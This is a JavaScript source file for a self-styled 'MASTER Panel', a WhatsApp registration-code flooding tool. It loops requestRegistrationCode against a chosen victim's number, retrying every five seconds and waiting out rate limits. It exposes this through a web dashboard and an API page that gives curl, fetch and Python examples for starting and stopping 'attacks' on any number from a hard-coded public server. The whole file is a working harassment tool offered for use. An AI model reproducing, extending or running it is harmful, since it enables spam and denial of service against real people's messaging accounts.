const gradient = require('gradient-string');
const pino = require('pino');
const fs = require('fs');
const { exec } = require('child_process');
const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');
const http = require('http');
const url = require('url');

// Setup
if (!fs.existsSync('./files')) fs.mkdirSync('./files');
if (!fs.existsSync('./files/numbers.json')) fs.writeFileSync('./files/numbers.json', JSON.stringify({}));

const color = (text, colors) => {
    try { return gradient(colors)(text); } catch (e) { return text; }
};

// --- MASTER Banner ---
const masterBanner = `
${color(' ███╗   ███╗ █████╗ ███████╗████████╗███████╗██████╗ ', ['#FF0000', '#800000'])}
${color(' ████╗ ████║██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗', ['#FF0000', '#800000'])}
${color(' ██╔████╔██║███████║███████╗   ██║   █████╗  ██████╔╝', ['#FF0000', '#800000'])}
${color(' ██║╚██╔╝██║██╔══██║╚════██║   ██║   ██╔════╝██╔══██╗', ['#FF0000', '#800000'])}
${color(' ██║ ╚═╝ ██║██║  ██║███████║   ██║   ███████╗██║  ██║', ['#FF0000', '#800000'])}
${color(' ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝', ['#FF0000', '#800000'])}
`;

const spiderArt = `
    ${color('          _xxxx_          ', ['#FF0000', '#200000'])}
    ${color('        /        \\        ', ['#FF0000', '#200000'])}
    ${color('      /            \\      ', ['#FF0000', '#200000'])}
    ${color('     |   _      _   |     ', ['#FF0000', '#FFFFFF'])}
    ${color('     |  (o)    (o)  |     ', ['#FF0000', '#FFFFFF'])}
    ${color('     |      __      |     ', ['#FF0000', '#200000'])}
    ${color('      \\    \\__/    /      ', ['#FF0000', '#200000'])}
    ${color('        \\________/        ', ['#FF0000', '#200000'])}
    ${color('      _ /        \\ _      ', ['#FF0000', '#200000'])}
    ${color('     /              \\     ', ['#FF0000', '#200000'])}
`;

// Embedded HTML Dashboard with Navigation & Docs
const dashboardHTML = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MASTER Panel Dashboard</title>
    <style>
        body {
            background-color: #0a0a0a;
            color: #ff0000;
            font-family: monospace;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .nav {
            margin-bottom: 20px;
        }
        .nav a {
            color: #fff;
            background: #222;
            padding: 10px 20px;
            margin: 0 5px;
            text-decoration: none;
            border: 1px solid #ff0000;
            border-radius: 5px;
            font-weight: bold;
        }
        .nav a.active {
            background: #800000;
        }
        .container {
            background-color: #111;
            padding: 30px;
            border: 2px solid #800000;
            border-radius: 10px;
            box-shadow: 0 0 15px #ff0000;
            text-align: center;
            width: 400px;
            max-width: 100%;
        }
        h2 {
            margin-top: 0;
            text-shadow: 0 0 5px #ff0000;
        }
        input {
            width: calc(100% - 20px);
            padding: 10px;
            margin: 10px 0;
            background-color: #222;
            border: 1px solid #ff0000;
            color: #fff;
            outline: none;
            font-family: monospace;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #800000;
            color: #fff;
            border: none;
            cursor: pointer;
            font-weight: bold;
            text-transform: uppercase;
            transition: 0.3s;
            margin-top: 5px;
        }
        button:hover {
            background-color: #ff0000;
        }
        .btn-stop {
            background-color: #550000;
        }
        .btn-stop:hover {
            background-color: #aa0000;
        }
        #status {
            margin-top: 15px;
            font-size: 14px;
            word-break: break-all;
        }
    </style>
</head>
<body>
    <div class="nav">
        <a href="/" class="active">Dashboard</a>
        <a href="/docs">API Docs</a>
    </div>

    <div class="container">
        <h2>👑 MASTER PANEL 👑</h2>
        <form id="targetForm">
            <input type="text" id="ddi" placeholder="Country Code (e.g., 92)" required>
            <input type="text" id="number" placeholder="Phone Number" required>
            <button type="submit">Deploy Target</button>
            <button type="button" class="btn-stop" id="stopBtn">Stop Target</button>
        </form>
        <div id="status"></div>
    </div>

    <script>
        document.getElementById('targetForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const ddi = document.getElementById('ddi').value.trim();
            const number = document.getElementById('number').value.trim();
            const statusDiv = document.getElementById('status');
            
            statusDiv.textContent = "Deploying...";
            statusDiv.style.color = "#ffff00";

            try {
                const response = await fetch('/submit?ddi=' + encodeURIComponent(ddi) + '&number=' + encodeURIComponent(number));
                const result = await response.json();
                statusDiv.textContent = result.message || result.error;
                statusDiv.style.color = response.ok ? "#00ff00" : "#ff0000";
            } catch (error) {
                statusDiv.textContent = "Failed to connect to backend.";
                statusDiv.style.color = "#ff0000";
            }
        });

        document.getElementById('stopBtn').addEventListener('click', async () => {
            const ddi = document.getElementById('ddi').value.trim();
            const number = document.getElementById('number').value.trim();
            const statusDiv = document.getElementById('status');

            if (!ddi || !number) {
                statusDiv.textContent = "Enter DDI and Number to stop.";
                statusDiv.style.color = "#ff4500";
                return;
            }

            statusDiv.textContent = "Stopping...";
            statusDiv.style.color = "#ffff00";

            try {
                const response = await fetch('/stop?ddi=' + encodeURIComponent(ddi) + '&number=' + encodeURIComponent(number));
                const result = await response.json();
                statusDiv.textContent = result.message || result.error;
                statusDiv.style.color = "#00ff00";
            } catch (error) {
                statusDiv.textContent = "Failed to connect to backend.";
                statusDiv.style.color = "#ff0000";
            }
        });
    </script>
</body>
</html>
`;

// Embedded API Documentation Page HTML
const docsHTML = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>API Documentation - MASTER Panel</title>
    <style>
        body {
            background-color: #0a0a0a;
            color: #ff0000;
            font-family: monospace;
            padding: 30px;
            max-width: 800px;
            margin: auto;
        }
        .nav {
            margin-bottom: 20px;
        }
        .nav a {
            color: #fff;
            background: #222;
            padding: 10px 20px;
            margin-right: 5px;
            text-decoration: none;
            border: 1px solid #ff0000;
            border-radius: 5px;
            font-weight: bold;
        }
        .nav a.active {
            background: #800000;
        }
        h1, h2 {
            text-shadow: 0 0 5px #ff0000;
        }
        pre {
            background: #111;
            padding: 15px;
            border: 1px solid #800000;
            border-radius: 5px;
            color: #00ff00;
            overflow-x: auto;
        }
        .endpoint {
            background: #150000;
            border: 1px solid #ff0000;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 8px;
        }
        span.method {
            background: #800000;
            color: white;
            padding: 2px 6px;
            font-weight: bold;
            border-radius: 3px;
        }
    </style>
</head>
<body>
    <div class="nav">
        <a href="/">Dashboard</a>
        <a href="/docs" class="active">API Docs</a>
    </div>

    <h1>📚 MASTER Panel API Documentation</h1>
    <p>Use these endpoints from any external code, script, bot, or web application to start and stop attacks.</p>

    <div class="endpoint">
        <h2>1. Start / Submit Endpoint</h2>
        <p><span class="method">GET</span> or <span class="method">POST</span> <code>http://16.171.40.254:2979/submit</code> (or <code>/start</code>)</p>
        <p><strong>Parameters (Query or JSON Body):</strong></p>
        <ul>
            <li><code>ddi</code>: Country code (e.g., <code>92</code>)</li>
            <li><code>number</code>: Phone number without country code (e.g., <code>3001234567</code>)</li>
        </ul>
        <p><strong>Example (cURL):</strong></p>
        <pre>curl "http://16.171.40.254:2979/submit?ddi=92&number=3001234567"</pre>
        <p><strong>Example (JavaScript Fetch):</strong></p>
        <pre>
fetch('http://16.171.40.254:2979/submit?ddi=92&number=3001234567')
  .then(res => res.json())
  .then(data => console.log(data));
        </pre>
        <p><strong>Example (Python):</strong></p>
        <pre>
import requests
res = requests.get('http://16.171.40.254:2979/submit', params={'ddi': '92', 'number': '3001234567'})
print(res.json())
        </pre>
    </div>

    <div class="endpoint">
        <h2>2. Stop Endpoint</h2>
        <p><span class="method">GET</span> or <span class="method">POST</span> <code>http://16.171.40.254:2979/stop</code></p>
        <p><strong>Parameters (Query or JSON Body):</strong></p>
        <ul>
            <li><code>ddi</code>: Country code</li>
            <li><code>number</code>: Phone number</li>
        </ul>
        <p><strong>Example (cURL):</strong></p>
        <pre>curl "http://16.171.40.254:2979/stop?ddi=92&number=3001234567"</pre>
    </div>
</body>
</html>
`;

// Active task tracking map
const activeTasks = new Map();

const start = async () => {
    console.clear(); 

    const mainChannel = 'https://whatsapp.com/channel/0029Va75f6BIXnlq8eZxTy2M';
    const openCmd = process.platform === 'win32' ? `start ${mainChannel}` : `termux-open-url ${mainChannel} || xdg-open ${mainChannel}`;

    exec(openCmd);

    console.log(masterBanner);
    console.log(spiderArt);
    console.log(color('╔════════════════════════════════════════════╗', ['#FF0000', '#4B0082']));
    console.log(color('║       👑 OWNER: NONAMEHACKER 👑            ║', ['#FFFFFF', '#FF0000']));
    console.log(color('║       🛡️ TEAM : Ｍ▲ＳＴΞЯ...               ║', ['#00FFFF', '#0000FF']));
    console.log(color('╚════════════════════════════════════════════╝', ['#FF0000', '#4B0082']));

    const { state } = await useMultiFileAuthState('.auth_session');

    const spam = makeWaSocket({
        auth: state,
        mobile: true,
        logger: pino({ level: 'silent' })
    });

    const dropNumber = async (context) => {
        const { ddi, number, phoneNumber } = context;
        if (activeTasks.has(phoneNumber)) return; // Already running for this number

        const taskState = { running: true, timeout: null };
        activeTasks.set(phoneNumber, taskState);

        while (taskState.running) {
            try {
                console.clear();
                console.log(masterBanner);
                console.log(spiderArt);
                console.log(color('───────────────────────────────────────', ['#FF0000', '#000000']));
                console.log(color(`  [+] SYSTEM STATUS : ACTIVE 🚀        `, ['#00FF00', '#FFFFFF']));
                console.log(color(`  [+] TARGET NUMBER : +${ddi}${number} `, ['#FF0000', '#FFFFFF']));
                console.log(color(`  [+] DEVELOPED BY  : NONAMEHACKER     `, ['#FFFF00', '#FFA500']));
                console.log(color('───────────────────────────────────────', ['#FF0000', '#000000']));

                const res = await spam.requestRegistrationCode({
                    phoneNumber: '+' + phoneNumber,
                    phoneNumberCountryCode: ddi,
                    phoneNumberNationalNumber: number,
                    phoneNumberMobileCountryCode: 724
                });

                if (!taskState.running) break;

                if (res && res.reason === 'temporarily_unavailable') {
                    console.log(color(`[!] LIMIT REACHED! WAITING: ${res.retry_after}s`, ['#FF4500', '#FF0000']));
                    const waitTime = (res.retry_after || 60) * 1000;
                    await new Promise(resolve => {
                        taskState.timeout = setTimeout(resolve, waitTime);
                    });
                } else {
                    await new Promise(resolve => {
                        taskState.timeout = setTimeout(resolve, 5000);
                    });
                }
            } catch (e) {
                if (!taskState.running) break;
                await new Promise(resolve => {
                    taskState.timeout = setTimeout(resolve, 5000);
                });
            }
        }
        activeTasks.delete(phoneNumber);
    };

    const stopNumber = (phoneNumber) => {
        const task = activeTasks.get(phoneNumber);
        if (task) {
            task.running = false;
            if (task.timeout) clearTimeout(task.timeout);
            activeTasks.delete(phoneNumber);
            return true;
        }
        return false;
    };

    // Spin up lightweight web server
    const server = http.createServer((req, res) => {
        const parsedUrl = url.parse(req.url, true);
        const pathname = parsedUrl.pathname;
        const query = parsedUrl.query;

        // Enable CORS for external API calls
        res.setHeader('Access-Control-Allow-Origin', '*');
        res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
        res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

        if (req.method === 'OPTIONS') {
            res.writeHead(204);
            res.end();
            return;
        }

        if (req.method === 'GET' && pathname === '/') {
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(dashboardHTML);
        } else if (req.method === 'GET' && pathname === '/docs') {
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(docsHTML);
        } else if (pathname === '/start' || pathname === '/submit') {
            const handleStart = (ddi, number) => {
                if (!ddi || !number) {
                    res.writeHead(400, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ error: 'Missing ddi or number parameters' }));
                    return;
                }
                const phoneNumber = ddi + number;
                dropNumber({ ddi, number, phoneNumber });
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ status: 'success', message: `Target +${phoneNumber} locked and deployed.` }));
            };

            if (req.method === 'GET') {
                handleStart(query.ddi, query.number);
            } else if (req.method === 'POST') {
                let body = '';
                req.on('data', chunk => body += chunk.toString());
                req.on('end', () => {
                    try {
                        const data = JSON.parse(body || '{}');
                        handleStart(data.ddi || query.ddi, data.number || query.number);
                    } catch (err) {
                        res.writeHead(400, { 'Content-Type': 'application/json' });
                        res.end(JSON.stringify({ error: 'Invalid JSON' }));
                    }
                });
            }
        } else if (pathname === '/stop') {
            const handleStop = (ddi, number) => {
                if (!ddi || !number) {
                    res.writeHead(400, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ error: 'Missing ddi or number parameters' }));
                    return;
                }
                const phoneNumber = ddi + number;
                const stopped = stopNumber(phoneNumber);
                res.writeHead(200, { 'Content-Type': 'application/json' });
                if (stopped) {
                    res.end(JSON.stringify({ status: 'success', message: `Target +${phoneNumber} stopped successfully.` }));
                } else {
                    res.end(JSON.stringify({ status: 'not_found', message: `Target +${phoneNumber} was not running.` }));
                }
            };

            if (req.method === 'GET') {
                handleStop(query.ddi, query.number);
            } else if (req.method === 'POST') {
                let body = '';
                req.on('data', chunk => body += chunk.toString());
                req.on('end', () => {
                    try {
                        const data = JSON.parse(body || '{}');
                        handleStop(data.ddi || query.ddi, data.number || query.number);
                    } catch (err) {
                        res.writeHead(400, { 'Content-Type': 'application/json' });
                        res.end(JSON.stringify({ error: 'Invalid JSON' }));
                    }
                });
            }
        } else {
            res.writeHead(404, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ error: 'Endpoint not found' }));
        }
    });

    server.listen(2979, '0.0.0.0', () => {
        console.log(color('\n ► SERVER RUNNING! Open http://16.171.40.254:2979 in your browser or visit /docs for API instructions.', ['#00FF00', '#FFFFFF']));
    });
};

start();
